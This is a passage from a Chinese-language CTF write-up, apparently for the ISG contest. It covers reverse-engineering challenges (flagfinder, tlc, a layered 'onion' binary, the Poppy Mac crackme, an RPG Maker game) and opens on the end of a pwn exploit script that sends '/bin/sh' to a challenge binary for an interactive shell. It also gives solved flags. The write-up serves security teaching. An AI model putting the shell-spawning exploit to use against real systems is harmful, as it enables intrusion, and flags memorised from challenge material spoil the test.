&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;&quot;end&nbsp;to&nbsp;send&nbsp;useful&nbsp;data&nbsp;end&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;$&nbsp;&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.write(&quot;/bin/sh;\n&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;io.interact()
io&nbsp;=&nbsp;get_io(target)
pwn(io)</pre><p style="margin-left: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="margin-left: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">flag如下:</span></p><p style="margin-left: 28px; text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p8.qhimg.com/t01010cc67b3781e8f9.png" src="http://p8.qhimg.com/t01a1aac125d44f0dcc.png" title="t01010cc67b3781e8f9.png"/></p><p><br/></p><h2 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 18px;">Reverse</span></h2><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">flagfinder (100)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">该程序的逻辑就是在磁盘上搜索文件,找到一个文件的md5值为target值时,会计算其相应的sha1256的值,据此生成flag,代码如下:</span></p><pre class="brush:cpp;toolbar:false">private&nbsp;static&nbsp;byte[]&nbsp;target&nbsp;=&nbsp;new&nbsp;byte[]&nbsp;{&nbsp;0x6c,&nbsp;0xcb,&nbsp;0x61,&nbsp;0x45,&nbsp;90,&nbsp;0xd8,&nbsp;0x92,&nbsp;0x19,&nbsp;0x90,&nbsp;0x2b,&nbsp;0x3a,&nbsp;0xf6,&nbsp;10,&nbsp;0x9a,&nbsp;0x2d,&nbsp;0x1c&nbsp;};</pre><p><br/></p><pre class="brush:cpp;toolbar:false">Console.WriteLine(&quot;Analyzing&nbsp;&quot;&nbsp;+&nbsp;file.FullName&nbsp;+&nbsp;&quot;&nbsp;...&quot;);
MD5CryptoServiceProvider&nbsp;provider&nbsp;=&nbsp;new&nbsp;MD5CryptoServiceProvider();
if&nbsp;(provider.ComputeHash(file.OpenRead()).SequenceEqual&lt;byte&gt;(target))
{
&nbsp;&nbsp;&nbsp;&nbsp;SHA256CryptoServiceProvider&nbsp;provider2&nbsp;=&nbsp;new&nbsp;SHA256CryptoServiceProvider();
Console.WriteLine(&quot;We&#39;ve&nbsp;found&nbsp;the&nbsp;flag&nbsp;on&nbsp;your&nbsp;hard&nbsp;drive:&quot;);
Console.WriteLine(&quot;ISG{&quot;&nbsp;+&nbsp;BitConverter.ToString(provider2.ComputeHash(file.OpenRead())).ToLower()&nbsp;+&nbsp;&quot;}&quot;);
&nbsp;&nbsp;&nbsp;&nbsp;Environment.Exit(0);
}</pre><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 直接找文件肯定不行,解决方法是,计算md5后,google一下,找到网站上面有,如下:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p4.qhimg.com/t01ab6dd21af90c7063.png" src="http://p3.qhimg.com/t0150b63a616038e0df.png" title="t01ab6dd21af90c7063.png"/></p><p><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">将其sha256,带入,计算的结果:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p3.qhimg.com/t01bd5da0247b56d181.png" src="http://p8.qhimg.com/t017d83192865db99e6.png" title="t01bd5da0247b56d181.png"/></p><p><br/></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">tlc (150)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">分析程序,首先输入12字节,然后rot13,然后base64解码,然后做了一个判断(高n位能被n整除),最后用输入作为密钥解密一段数据,得到flag。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">但是满足高n位能被n整除的数很多,于是爆破。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">根据base64后数据位12字节,原始的数可能的位数为7,8,9。(先试的8和7都不行,最后才试的9)</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">首先生成满足高n位能被n整除的数据:</span></p><pre class="brush:cpp;toolbar:false">#include&nbsp;&lt;iostream&gt;
using&nbsp;namespace&nbsp;std;
int&nbsp;main()
{
&nbsp;&nbsp;&nbsp;&nbsp;int&nbsp;i,j,temp;
&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(i=0;i&lt;=1000000000;i++)
&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=i;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for&nbsp;(j=9;j&gt;1;j--)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(temp&nbsp;%&nbsp;j&nbsp;==&nbsp;0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;temp=temp/10;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;continue;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;(j==1)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cout&lt;&lt;i&lt;&lt;endl;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;}
&nbsp;}</pre><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">运行tlc得到程序输出</span></p><pre class="brush:python;toolbar:false">import&nbsp;base64
from&nbsp;zio&nbsp;import&nbsp;*
target&nbsp;=&nbsp;&#39;./tlc&#39;
def&nbsp;rot13(s):
&nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;=&nbsp;{chr(i+c):&nbsp;chr((i+13)%26+c)&nbsp;for&nbsp;i&nbsp;in&nbsp;range(26)&nbsp;for&nbsp;c&nbsp;in&nbsp;(65,97)}
&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;&#39;&#39;.join([d.get(c,c)&nbsp;for&nbsp;c&nbsp;in&nbsp;s])
def&nbsp;exp(target,&nbsp;s):
&nbsp;&nbsp;&nbsp;&nbsp;#io&nbsp;=&nbsp;zio(target,&nbsp;timeout=10000,&nbsp;print_read=COLORED(REPR,&nbsp;&#39;red&#39;),&nbsp;print_write=COLORED(REPR,&nbsp;&#39;green&#39;))
&nbsp;&nbsp;&nbsp;&nbsp;io&nbsp;=&nbsp;zio(target,&nbsp;timeout=10000,&nbsp;print_read=COLORED(NONE,&nbsp;&#39;red&#39;),&nbsp;print_write=COLORED(NONE,&nbsp;&#39;green&#39;))
&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&quot;:&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;io.writeline(s)
&nbsp;&nbsp;&nbsp;&nbsp;io.read_until(&#39;:&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;io.readline().strip(&#39;\n&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;io.close()
f&nbsp;&nbsp;=&nbsp;open(&#39;./len9.txt&#39;,&nbsp;&#39;r&#39;)
for&nbsp;line&nbsp;in&nbsp;f:
&nbsp;&nbsp;&nbsp;&nbsp;line&nbsp;=&nbsp;line.strip().rjust(9,&nbsp;&#39;0&#39;)
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;line&nbsp;!=&nbsp;&#39;&#39;:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print&nbsp;line
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;exp(target,rot13(base64.encodestring(line)))</pre><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">在输出中搜索ISG发现,数为381654729时,输出flag。</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p9.qhimg.com/t018765fd403ae325b5.png" src="http://p5.qhimg.com/t01a6606b5ce34fa354.png" title="t018765fd403ae325b5.png"/></p><p><br/></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">是男人就下一百层 (300)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">分析程序,只有一个start函数,无数行汇编代码。功能很简单,让输入数据,然后对数据进行8字节逐个比较,最后如果都满足,用jmp rsp执行刚才输入的数据。</span></p><pre class="brush:cpp;toolbar:false">.text:0000000001092509&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;al,&nbsp;[rsp+3B98E4h]
.text:0000000001092510&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;al,&nbsp;0FFh
.text:0000000001092512&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;short&nbsp;loc_1092516
.text:0000000001092514&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmp&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;rsp</pre><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">本来想用ida提取汇编代码,不过ida分析实在太慢了,于是用了一个反汇编库,生成汇编代码。</span></p><pre class="brush:python;toolbar:false">import&nbsp;capstone
target&nbsp;=&nbsp;&#39;./onion&#39;
f&nbsp;=&nbsp;open(target,&nbsp;&#39;rb&#39;)
CODE&nbsp;=&nbsp;f.read()[0x157:0x1092509-0x400000]
#CODE&nbsp;=&nbsp;f.read()[0x157:0x157+0x100]
f.close()
md&nbsp;=&nbsp;capstone.Cs(capstone.CS_ARCH_X86,&nbsp;capstone.CS_MODE_64)
for&nbsp;i&nbsp;in&nbsp;md.disasm(CODE,&nbsp;0x400157):
&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;i.mnemonic
&nbsp;&nbsp;&nbsp;&nbsp;#print&nbsp;i.op_str
print&nbsp;&quot;0x%x:\t%s\t%s&quot;&nbsp;%(i.address,&nbsp;i.mnemonic,&nbsp;i.op_str)</pre><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">提取出汇编中mov rbx,imm中立即数的值,组合作为输入。</span></p><pre class="brush:python;toolbar:false">f&nbsp;=&nbsp;open(&#39;a.txt&#39;,&nbsp;&#39;rb&#39;)
payload&nbsp;=&nbsp;&#39;&#39;
for&nbsp;line&nbsp;in&nbsp;f:
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&#39;movabs&#39;&nbsp;in&nbsp;line:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;value&nbsp;=&nbsp;line.split(&#39;,&#39;)[1].strip()
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;value.startswith(&#39;-&#39;):
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;=&nbsp;int(value,&nbsp;16)&nbsp;+&nbsp;0xffffffffffffffff&nbsp;+&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;else:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;d&nbsp;=&nbsp;int(value,&nbsp;16)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;payload&nbsp;+=&nbsp;l64(d)
payload&nbsp;+=&nbsp;&#39;\xff&#39;*5
f.close()
f&nbsp;=&nbsp;open(&#39;b.txt&#39;,&nbsp;&#39;wb&#39;)
f.write(payload)
f.close()</pre><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">这样求出来的只是过了第一层,后面层的方法类似。最后解到9层,看到一段赋值的汇编码,提取出来就是flag。</span></p><pre class="brush:python;toolbar:false">d&nbsp;=&nbsp;&#39;&#39;&#39;
0x17b:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp],&nbsp;0x54
0x17f:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;1],&nbsp;0x68
0x184:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;2],&nbsp;0x65
0x189:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;3],&nbsp;0x20
0x18e:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;4],&nbsp;0x66
0x193:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;5],&nbsp;0x6c
0x198:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;6],&nbsp;0x61
0x19d:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;7],&nbsp;0x67
0x1a2:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;8],&nbsp;0x20
0x1a7:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;9],&nbsp;0x69
0x1ac:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0xa],&nbsp;0x73
0x1b1:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0xb],&nbsp;0x20
0x1b6:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0xc],&nbsp;0x49
0x1bb:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0xd],&nbsp;0x53
0x1c0:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0xe],&nbsp;0x47
0x1c5:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0xf],&nbsp;0x7b
0x1ca:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x10],&nbsp;0x47
0x1cf:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x11],&nbsp;0x31
0x1d4:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x12],&nbsp;0x76
0x1d9:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x13],&nbsp;0x33
0x1de:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x14],&nbsp;0x5f
0x1e3:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x15],&nbsp;0x79
0x1e8:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x16],&nbsp;0x30
0x1ed:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x17],&nbsp;0x55
0x1f2:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x18],&nbsp;0x5f
0x1f7:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x19],&nbsp;0x4d
0x1fc:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x1a],&nbsp;0x59
0x201:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x1b],&nbsp;0x5f
0x206:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x1c],&nbsp;0x4f
0x20b:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x1d],&nbsp;0x6e
0x210:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x1e],&nbsp;0x31
0x215:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x1f],&nbsp;0x30
0x21a:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x20],&nbsp;0x6e
0x21f:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x21],&nbsp;0x5f
0x224:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x22],&nbsp;0x68
0x229:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x23],&nbsp;0x33
0x22e:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x24],&nbsp;0x34
0x233:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x25],&nbsp;0x72
0x238:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x26],&nbsp;0x37
0x23d:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x27],&nbsp;0x7d
0x242:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x28],&nbsp;0xa
0x247:&nbsp;&nbsp;mov&nbsp;byte&nbsp;ptr&nbsp;[rsp&nbsp;+&nbsp;0x29],&nbsp;0
&#39;&#39;&#39;
aaa&nbsp;=&nbsp;&#39;&#39;
for&nbsp;a&nbsp;in&nbsp;d.split(&#39;\n&#39;):
&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;&#39;,&#39;&nbsp;in&nbsp;a:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;aaa&nbsp;+=&nbsp;chr(int(a.split(&#39;,&#39;)[1],16))
print&nbsp;aaa</pre><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">输出:</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p0.qhimg.com/t01bb2df4536be0f907.png" src="http://p8.qhimg.com/t01065be26ec26e4b62.png" title="t01bb2df4536be0f907.png"/></p><p><br/></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Poppy (350)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">第一次在ctf中遇到mac程序,这是在欺负穷人。所以最开始基本是一直在静态看,只有最后才用土豪队友的mac本运行得到flag。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">首先看程序,感觉就是标准的crackme,然后陷入了出题人的陷阱中,去分析前面的变换算法。</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p6.qhimg.com/t016cb5125d3d6224d4.png" src="http://p1.qhimg.com/t016be5f8037ad6d4b1.png" title="t016cb5125d3d6224d4.png"/></p><p><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">变换算法是经过混淆的,有同或、异或啥的,最后化解如下:</span></p><pre class="brush:python;toolbar:false">v12&nbsp;=&nbsp;0x476E614B
v11&nbsp;=&nbsp;0x306F7261
v10&nbsp;=&nbsp;0x47475349&nbsp;&lt;&lt;&nbsp;6
for&nbsp;i&nbsp;in&nbsp;range(64):
&nbsp;&nbsp;&nbsp;&nbsp;v11&nbsp;=&nbsp;v11&nbsp;-&nbsp;((a+(v12&gt;&gt;5))&nbsp;^&nbsp;(v12+v10)^(b+16*v12))
&nbsp;&nbsp;&nbsp;&nbsp;v12&nbsp;=&nbsp;v12&nbsp;-&nbsp;((c+(v11&gt;&gt;5)&nbsp;)^&nbsp;((v10+v11)^(d+16*v11)))
&nbsp;&nbsp;&nbsp;&nbsp;v10&nbsp;-=&nbsp;0x47475349
need&nbsp;(v12&nbsp;==&nbsp;0x8906C3AD)
need&nbsp;(v11&nbsp;==&nbsp;0x0B442F5FC)</pre><p style="text-align: left;"><span style="background: rgb(217, 217, 217) none repeat scroll 0% 0%; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">TEA加密算法,知道明文、密文,求key。不会。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">后来 发现后面还有点代码,反正没事,就看看了。</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p5.qhimg.com/t010544f2db97ad2e39.png" src="http://p6.qhimg.com/t014e8cdabbeef8fd5e.png" title="t010544f2db97ad2e39.png"/></p><p><br/></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">在sub_100001530中,首先用输入的前6个字节与程序中的数据异或生成了一个url。url的开头肯定是http://或者</span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="https://，基于此，算出了输入的前6"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">https://,基于此,算出了输入的前6</span></a><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">个字节。求得前6个字节为T0mato,解出来的url为</span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="https://ctftime.org/event/"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">https://ctftime.org/event/</span></a><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">。</span></p><p style="text-indent: 21px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">后面程序进入一个18次的循环,每次去访问ctftime的一个页面,然后调用了一个控制流混淆过的函数。</span></p><p style="text-indent: 21px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">混淆函数没完全看明白,大概猜测是获取某行的第某个字节。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 想到题目中说flag为ISG{未输出的内容},v2为char型,循环了18次,比较可能跟flag有关。</span></p><p style="text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p9.qhimg.com/t01fa336a4acfeb4736.png" src="http://p9.qhimg.com/t013355ab0e5213f6da.png" title="t01fa336a4acfeb4736.png"/></p><p><br/></p><p style="text-indent: 28px; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">后面就用mac本进行调试了,直接在sub_100001330函数返回处下断点,查看每次的eax值,组合起来就是flag。(因网络问题,有时返回的可能为0,需要重跑)。</span></p><p style="text-indent: 28px; text-align: left;"><br/></p><p style="text-align: center;"><img alt="http://p1.qhimg.com/t015f342d2383ecff5c.png" src="http://p2.qhimg.com/t0185054b7be5c75b24.png" title="t015f342d2383ecff5c.png"/></p><p><br/></p><p style="text-align:left"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Flag为ISG{whatAb0uTacupoFte4}</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Ps:论有mac本的重要性。</span></p><h3 style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">RPG (400)</span></h3><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">分析发现是用rpg maker xp制作出来的游戏,于是下载了该软件。在game目录下放一个Game.rxproj,文件中内容为“RPGXP 1.03”,然后可以打开工程了。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Rpg maker xp中支持脚本,ruby语法的,然后花了些时间学习怎么用脚本。最后写了个程序提取出地图信息,主要就是用game_player.passable?(x,y, d)判断是否通行。</span></p><p style="text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Rpg中运行脚本很容易卡死,这里需要分多次提取地图信息。</span></p><pre class="brush:python;toolbar:false">file1&nbsp;=&nbsp;File.new(&quot;path.info&quot;,&nbsp;&quot;ab+&quot;)
&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;i&nbsp;=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;str&nbsp;=&nbsp;String.new
&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;i&nbsp;&lt;&nbsp;498&nbsp;do
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;str&nbsp;=&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;j&nbsp;=&nbsp;1
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;while&nbsp;j&nbsp;&lt;&nbsp;498&nbsp;do
